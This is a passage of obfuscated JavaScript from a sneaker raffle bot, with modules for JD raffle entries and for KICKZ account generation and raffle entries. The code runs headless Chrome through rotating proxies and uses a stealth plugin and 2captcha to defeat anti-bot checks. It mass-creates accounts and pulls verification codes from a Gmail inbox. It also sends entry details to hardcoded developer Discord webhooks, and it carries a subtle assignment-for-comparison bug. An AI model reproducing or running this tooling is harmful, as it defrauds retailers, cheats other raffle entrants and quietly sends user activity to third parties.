                        var _0x36ab58 = '', _0x4921a9 = 0x0;
                    var _0x402db0, _0x35b4ad = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x21665d[_0x160d1f]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x21665d[_0x160d1f]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x3919f0
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x6a12f3['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5696e3
                            }
                        ]
                    }];
                    const _0x32e8c0 = { 'embeds': _0x35b4ad };
                    _0xd208b3(_0xcbd097['name'] + '\x20Task\x20' + (_0x160d1f + 0x1) + '\x20/\x20' + _0x21665d['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                    try {
                        await _0x3cf8c0(_0x21665d, _0x160d1f);
                    } catch {
                        _0x36ab58 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x47ed79 = await _0x3aa619(_0x21665d[_0x160d1f], _0xcbd097, 'dev', ![]), _0x1c77af = await _0x3aa619(_0x21665d[_0x160d1f], _0xcbd097, 'pub', ![]);
                    const _0x2d8dc4 = {
                        'succesDEVMSG': { 'embeds': [_0x47ed79] },
                        'succesPUBMSG': { 'embeds': [_0x1c77af] }
                    };
                    if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                        try {
                            await _0x471d59(_0x6a12f3['webhook'], _0x2d8dc4['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x2d8dc4['succesDEVMSG']), await _0x1d2efb(0xc8);
                    try {
                        await _0x471d59(_0x1d6d5c, _0x2d8dc4['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x21665d[_0x160d1f]['Email'] == '' || _0x21665d[_0x160d1f]['Url'] == '' || _0x21665d[_0x160d1f]['FirstName'] == '' || _0x21665d[_0x160d1f]['LastName'] == '') {
                        console['log'](_0x24cf02() + '\x20[' + _0x41677c[taskModule]['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x6a12f3['useRandomProxy'] = ![])
                        var _0x28bd56 = _0x20e3cb[_0x160d1f]['split'](':');
                    else
                        var _0x32f949 = Math['round'](Math['random']() * (_0x20e3cb['length'] - 0x1)), _0x28bd56 = _0x20e3cb[_0x32f949]['split'](':');
                    var _0x40e6da;
                    try {
                        _0x40e6da = await _0xd499ac['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x28bd56[0x0] + ':' + _0x28bd56[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x40e6da = await _0xd499ac['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x28bd56[0x0] + ':' + _0x28bd56[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x341982 = await _0x40e6da['newPage']();
                        await _0x341982['authenticate']({
                            'username': '' + _0x28bd56[0x2],
                            'password': '' + _0x28bd56[0x3]
                        }), console['log'](_0x24cf02() + '\x20[' + _0xcbd097['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x341982['setRequestInterception'](!![]), _0x341982['on']('request', _0x4cc33a => {
                            _0x4cc33a['resourceType']() === 'image' || _0x4cc33a['resourceType']() === 'font' || _0x4cc33a['resourceType']() === 'media' ? _0x4cc33a['abort']() : _0x4cc33a['continue']();
                        });
                        try {
                            await _0x341982['goto']('' + _0x21665d[_0x160d1f]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x341982['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x24cf02() + '\x20[' + _0xcbd097['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20Filling\x20Information'), await _0x341982['type']('#comp_firstname', '' + _0x21665d[_0x160d1f]['FirstName']), await _0x341982['waitForSelector']('#comp_lastname'), await _0x341982['type']('#comp_lastname', '' + _0x21665d[_0x160d1f]['LastName']), await _0x341982['waitForSelector']('#comp_email'), await _0x341982['type']('#comp_email', '' + _0x21665d[_0x160d1f]['Email']), await _0x341982['waitForSelector']('#comp_paypalemail'), await _0x341982['type']('#comp_paypalemail', '' + _0x21665d[_0x160d1f]['Email']), await _0x341982['waitForSelector']('#comp_mobile_end'), await _0x341982['type']('#comp_mobile_end', '' + _0x21665d[_0x160d1f]['Phone']), await _0x341982['waitForSelector']('#comp_dob'), await _0x341982['type']('#comp_dob', '08/09/1992'), console['log'](_0x24cf02() + '\x20[' + _0xcbd097['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x21665d[_0x160d1f]['Size'] == 'RANDOM') {
                            const _0x3669bf = await _0x341982['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x553747 => {
                                return _0x553747['map'](_0x15a355 => _0x15a355['value']);
                            });
                            var _0x312e26 = Math['round'](Math['random']() * (_0x3669bf['length'] - 0x2));
                            await _0x341982['select']('#shoesize', _0x3669bf[_0x312e26 + 0x1]), await _0x1d2efb(0x3e8);
                        } else {
                            const _0x12c770 = await _0x341982['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x388132 => {
                                return _0x388132['map'](_0x1c485e => _0x1c485e['innerText']);
                            }), _0x1a5722 = await _0x341982['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x106467 => {
                                return _0x106467['map'](_0x23c0d9 => _0x23c0d9['value']);
                            });
                            var _0xb37edd = _0x21665d[_0x160d1f]['Size'];
                            for (var _0x406623 = 0x1; _0x406623 < _0x1a5722['length']; _0x406623++) {
                                var _0x1be851 = _0x12c770[_0x406623]['split']('\x20')[0x0];
                                if (_0x1be851 == _0xb37edd) {
                                    await _0x341982['select']('#shoesize', _0x1a5722[_0x406623]);
                                    break;
                                } else {
                                    if (_0x406623 + 0x1 == _0x1a5722['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x341982['waitForSelector']('#comp_address1'), await _0x341982['type']('#comp_address1', _0x21665d[_0x160d1f]['Address1'] + '\x20' + _0x21665d[_0x160d1f]['HouseNumber']), await _0x341982['waitForSelector']('#comp_address2'), await _0x341982['type']('#comp_address2', '' + _0x21665d[_0x160d1f]['Address2']), await _0x341982['waitForSelector']('#comp_address2'), await _0x341982['type']('#comp_address3', '' + _0x21665d[_0x160d1f]['City']), await _0x341982['waitForSelector']('#comp_postcode'), await _0x341982['type']('#comp_postcode', '' + _0x21665d[_0x160d1f]['Zip']), console['log'](_0x24cf02() + '\x20[' + _0xcbd097['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1d2efb(0x4b0), await _0x341982['click']('label#emailhold'), await _0x1d2efb(0x5dc), await _0x341982['click']('#preauth_tandc_email\x20>\x20label'), await _0x1d2efb(0x5dc), await _0x341982['click']('#submit');
                        try {
                            await _0x341982['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x24cf02() + '\x20[' + _0xcbd097['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20' + _0x1b5f76['blue']('Awaiting\x20Paypal\x20Payment')), _0x40e6da['on']('targetcreated', async _0x2d00b0 => {
                            if (_0x2d00b0['type']() === 'page') {
                                const _0x4743c1 = await _0x2d00b0['page']();
                                async function _0x50950a() {
                                    try {
                                        await _0x341982['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x177a87 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x321ef8() {
                                    try {
                                        await _0x341982['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x31228e = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x321ef8(), _0x50950a(), await _0x1d2efb(0x493e0);
                            }
                        });
                        async function _0x2d67ed() {
                            for (let _0x2ac91f = 0x0; _0x2ac91f < 0x12c; _0x2ac91f++) {
                                if (_0x31228e == !![]) {
                                    _0x36ab58 = 'no', _0x21396e(_0x21665d[_0x160d1f], _0xcbd097), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0xcbd097['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '')
                                        try {
                                            await _0x471d59(_0x6a12f3['webhook'], _0x2d8dc4['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x2d8dc4['succesDEVMSG']), await _0x1d2efb(0xc8);
                                    try {
                                        await _0x471d59(_0x1d6d5c, _0x2d8dc4['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x177a87)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x1d2efb(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x1d2efb(0xbb8), await _0x341982['click']('.zoid-outlet'), await _0x1d2efb(0x7d0), await _0x2d67ed();
                    } catch (_0x2fbe1c) {
                        console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xcbd097['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20' + _0x2fbe1c)), _0x402db0 = '' + _0x2fbe1c;
                        var _0x272840 = await _0x3aa619(_0x21665d[_0x160d1f], _0xcbd097, 'dev', !![], _0x402db0);
                        _0x2d8dc4['errorDEV'] = { 'embeds': [_0x272840] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x2d8dc4['errorDEV']), await _0x471d59(_0x32fdb9, _0x2d8dc4['errorDEV']);
                    } finally {
                        _0x40e6da && _0x40e6da['close']();
                        if (_0x36ab58 == 'yes' && _0x4921a9 != 0x5 && _0x402db0 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xcbd097['name'] + ']\x20Task\x20' + (_0x160d1f + 0x1) + '\x20:\x20Retrying\x20(' + _0x4921a9 + '\x20/\x205)')), _0x160d1f = _0x160d1f - 0x1, _0x4921a9 = _0x4921a9 + 0x1;
                            continue;
                        }
                        _0x36ab58 == 'yes' && _0x4921a9 >= 0x5 && (_0x12ac99(afew[_0x160d1f], _0xcbd097), _0x36ab58 = 'no', _0x4921a9 = 0x0), console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x31e5b2, _0x17afb9, _0x195c04) {
                    _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x6a12f3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1eb552 = 0x0; _0x1eb552 < _0x17afb9['length']; _0x1eb552++) {
                        const _0x3becc4 = 'https://www.kickz.com/login';
                        if (_0x3324ec != 'yes')
                            var _0x3324ec = '', _0x275857 = 0x0;
                        _0xd208b3(_0x31e5b2['name'] + '\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20/\x20' + _0x17afb9['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                        try {
                            await _0x3cf8c0(_0x17afb9, _0x1eb552);
                        } catch {
                            _0x3324ec = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x414456 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3919f0
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x6a12f3['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5696e3
                                }
                            ]
                        }];
                        const _0x14f3c4 = { 'embeds': _0x414456 };
                        var _0x322fef = await _0x3aa619(_0x17afb9[_0x1eb552], _0x31e5b2, 'acc', ![]);
                        const _0x3ea525 = { 'succesDEVMSG': { 'embeds': [_0x322fef] } };
                        if (_0x17afb9[_0x1eb552]['Email'] == '' || _0x17afb9[_0x1eb552]['FirstName'] == '' || _0x17afb9[_0x1eb552]['LastName'] == '') {
                            console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x17afb9[_0x1eb552]['Password'] == '' && (_0x17afb9[_0x1eb552]['Password'] = 'JRaffles23!');
                        if (_0x6a12f3['useRandomProxy'] = ![])
                            var _0x1acc7f = _0x195c04[_0x1eb552]['split'](':');
                        else
                            var _0xa34c0c = Math['round'](Math['random']() * (_0x195c04['length'] - 0x1)), _0x1acc7f = _0x195c04[_0xa34c0c]['split'](':');
                        var _0x82a4dc;
                        try {
                            _0x82a4dc = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1acc7f[0x0] + ':' + _0x1acc7f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x82a4dc = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1acc7f[0x0] + ':' + _0x1acc7f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x75fb00 = await _0x82a4dc['newPage']();
                            await _0x75fb00['authenticate']({
                                'username': '' + _0x1acc7f[0x2],
                                'password': '' + _0x1acc7f[0x3]
                            }), console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x75fb00['setRequestInterception'](!![]), _0x75fb00['on']('request', _0x1e62e0 => {
                                _0x1e62e0['resourceType']() === 'image' || _0x1e62e0['resourceType']() === 'font' || _0x1e62e0['resourceType']() === 'media' ? _0x1e62e0['abort']() : _0x1e62e0['continue']();
                            }), await _0x75fb00['goto'](_0x3becc4), await _0x1d2efb(0xbb8), console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x75fb00['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x75fb00['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x75fb00['waitForSelector']('#button-register'), await _0x1d2efb(0x7d0), await _0x75fb00['evaluate'](() => {
                                const _0x27fc15 = document['querySelector']('#button-register');
                                _0x27fc15['click']();
                            }), console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1d2efb(0x1388), await _0x75fb00['waitForSelector']('#customer_salutation'), await _0x75fb00['select']('#customer_salutation', 'mr'), await _0x1d2efb(0x7d0), await _0x75fb00['waitForSelector']('#customer_firstname'), await _0x75fb00['type']('#customer_firstname', '' + _0x17afb9[_0x1eb552]['FirstName']), await _0x1d2efb(0x352), await _0x75fb00['waitForSelector']('#customer_lastname'), await _0x75fb00['type']('#customer_lastname', '' + _0x17afb9[_0x1eb552]['LastName']), await _0x1d2efb(0x352), await _0x75fb00['type']('#email-input', '' + _0x17afb9[_0x1eb552]['Email']), await _0x1d2efb(0x352), await _0x75fb00['type']('#email-confirm-input', '' + _0x17afb9[_0x1eb552]['Email']), await _0x1d2efb(0x352), await _0x75fb00['type']('#register-password', '' + _0x17afb9[_0x1eb552]['Password']), await _0x1d2efb(0x352), await _0x75fb00['type']('#password-confirm', '' + _0x17afb9[_0x1eb552]['Password']), await _0x1d2efb(0x352), console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x75fb00['click']('#consent'), await _0x1d2efb(0x1f4);
                            const _0x43b8f9 = await _0x75fb00['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x43b8f9) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x75fb00['click']('#buttonRegister');
                            try {
                                await _0x75fb00['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x17afb9[_0x1eb552]['Email']), await _0x1d2efb(0x4b0);
                            async function _0x2ff0c9() {
                                var _0x2c9697, _0x2d6ea6 = ![];
                                for (var _0x307ed7 = 0x0; _0x307ed7 < 0x18; _0x307ed7++) {
                                    async function _0x20e88a() {
                                        var _0x4c7fb9 = new _0x2fec54({
                                            'user': _0x6a12f3['masterMail'],
                                            'password': _0x6a12f3['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x30fe87(_0x4cd59e) {
                                            _0x4c7fb9['openBox']('INBOX', ![], _0x4cd59e);
                                        }
                                        _0x4c7fb9['once']('ready', function () {
                                            console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x30fe87(function (_0x42f737, _0x41069b) {
                                                console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x42f737)
                                                    throw _0x42f737;
                                                _0x4c7fb9['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x286a7b, _0x1cbf0c) {
                                                    if (!_0x1cbf0c || !_0x1cbf0c['length'])
                                                        console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x4c7fb9['end']();
                                                    else {
                                                        var _0x437043 = _0x4c7fb9['seq']['fetch'](_0x1cbf0c, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x437043['on']('message', function (_0x1294b8, _0x17f128) {
                                                            var _0x5c2601 = '(#' + _0x17f128 + ')\x20';
                                                            _0x1294b8['on']('body', function (_0x2280b9, _0x8eea03) {
                                                                _0xe064d3(_0x2280b9, (_0x1fdc65, _0x5a42cc) => {
                                                                    if (_0x5a42cc['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x148441 = _0x5a42cc['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x1aa4c6 = _0x148441[0x1]['split']('<')[0x0];
                                                                        _0x2c9697 = _0x1aa4c6;
                                                                    }
                                                                });
                                                            }), _0x1294b8['once']('end', function () {
                                                            });
                                                        }), _0x437043['once']('error', function (_0x452263) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x437043['once']('end', function () {
                                                            _0x4c7fb9['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x4c7fb9['once']('error', function (_0x378acb) {
                                            console['log'](_0x1b5f76['red'](_0x378acb['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2d6ea6 = !![];
                                        }), _0x4c7fb9['once']('end', async function () {
                                        }), _0x4c7fb9['connect']();
                                    }
                                    _0x20e88a(), await _0x1d2efb(0x1388);
                                    if (_0x2c9697)
                                        return _0x2c9697;
                                    if (_0x2d6ea6)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x307ed7 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2ff0c9(), _0x1d2efb(0x320), console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Verifying..'), await _0x75fb00['type']('#verificationCode', code), await _0x1d2efb(0x1f4), await _0x75fb00['click']('#buttonVerify'), await _0x1d2efb(0x190), await _0x75fb00['click']('#buttonVerify'), await _0x1d2efb(0x3e8);
                            try {
                                await _0x75fb00['waitForSelector']('div.b-user_greeting'), _0x3324ec = 'no', console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Account\x20' + _0x17afb9[_0x1eb552]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x3601e1['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x17afb9[_0x1eb552]['Email'] + ',' + _0x17afb9[_0x1eb552]['Password'] + ','), console['log'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Account\x20' + _0x17afb9[_0x1eb552]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x3ea525['succesDEVMSG']);
                                } catch {
                                }
                                await _0x471d59(_0x70ae37, _0x3ea525['succesDEVMSG']);
                            } catch {
                                _0x3324ec = 'no', console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x42b09c) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20' + _0x42b09c)), _0x414456[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x414456[0x0]['description'] = '' + _0x42b09c, await _0x471d59(_0x32fdb9, _0x14f3c4), _0x3324ec = 'yes';
                        } finally {
                            _0x82a4dc && _0x82a4dc['close']();
                            if (_0x3324ec == 'yes' && _0x275857 != 0x5) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x31e5b2['name'] + ']\x20Task\x20' + (_0x1eb552 + 0x1) + '\x20:\x20Retrying\x20(' + _0x275857 + '\x20/\x205)')), _0x1eb552 = _0x1eb552 - 0x1, _0x275857 = _0x275857 + 0x1;
                                continue;
                            }
                            _0x3324ec == 'yes' && _0x275857 >= 0x5 && (_0x12ac99(_0x17afb9[_0x1eb552], _0x31e5b2), _0x3324ec = 'no', _0x275857 = 0x0), console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x16841a, _0x576f9a, _0x5f12aa) {
                    _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x6a12f3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xe10db5 = 0x0; _0xe10db5 < _0x576f9a['length']; _0xe10db5++) {
                        var _0x288ecd;
                        if (_0x5e10cd != 'yes')
                            var _0x5e10cd = '', _0xb7f62f = 0x0;
                        _0xd208b3(_0x16841a['name'] + '\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20/\x20' + _0x576f9a['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                        var _0x5c11dc = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3919f0
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x576f9a[_0xe10db5]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x576f9a[_0xe10db5]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x6a12f3['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5696e3
                                }
                            ]
                        }], _0x360451 = await _0x3aa619(_0x576f9a[_0xe10db5], _0x16841a, 'dev', ![]), _0x575676 = await _0x3aa619(_0x576f9a[_0xe10db5], _0x16841a, 'pub', ![]);
                        const _0x38bd1b = {
                            'succesDEVMSG': { 'embeds': [_0x360451] },
                            'succesPUBMSG': { 'embeds': [_0x575676] }
                        };
                        try {
                            await _0x3cf8c0(_0x576f9a, _0xe10db5);
                        } catch {
                            _0x5e10cd = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x576f9a[_0xe10db5]['Email'] == '' || _0x576f9a[_0xe10db5]['Password'] == '' || _0x576f9a[_0xe10db5]['FirstName'] == '' || _0x576f9a[_0xe10db5]['LastName'] == '') {
                            console['log'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x6a12f3['useRandomProxy'] = ![])
                            var _0x4a6a65 = _0x5f12aa[_0xe10db5]['split'](':');
                        else
                            var _0x98ff25 = Math['round'](Math['random']() * (_0x5f12aa['length'] - 0x1)), _0x4a6a65 = _0x5f12aa[_0x98ff25]['split'](':');
                        var _0x9aef6f;
                        try {
                            _0x9aef6f = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x4a6a65[0x0] + ':' + _0x4a6a65[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x9aef6f = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x4a6a65[0x0] + ':' + _0x4a6a65[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x298506 = await _0x9aef6f['newPage']();
                            await _0x298506['authenticate']({
                                'username': '' + _0x4a6a65[0x2],
                                'password': '' + _0x4a6a65[0x3]
                            }), console['log'](_0x24cf02() + '\x20[' + _0x16841a['name'] + ']\x20Task\x20' + (_0xe10db5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x298506['setRequestInterception'](!![]), _0x298506['on']('request', _0x31839f => {
